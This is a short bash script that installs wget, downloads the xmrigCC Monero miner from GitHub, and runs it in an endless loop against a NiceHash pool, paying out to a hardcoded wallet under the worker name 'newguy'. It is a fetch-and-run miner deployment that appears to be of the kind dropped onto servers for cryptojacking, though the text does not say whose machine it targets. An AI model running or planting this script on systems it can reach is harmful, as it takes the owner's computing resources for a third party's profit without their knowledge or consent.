#!/bin/bash

yum install wget
yum install xz -y

wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.0/xmrigCC-miner_only-3.4.0-linux-dynamic-amd64.tar.gz && tar -xf xmrigCC-miner_only-3.4.0-linux-dynamic-amd64.tar.gz && while true; do ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.newguy -p x -a rx/0 -k ; sleep 3 ; done
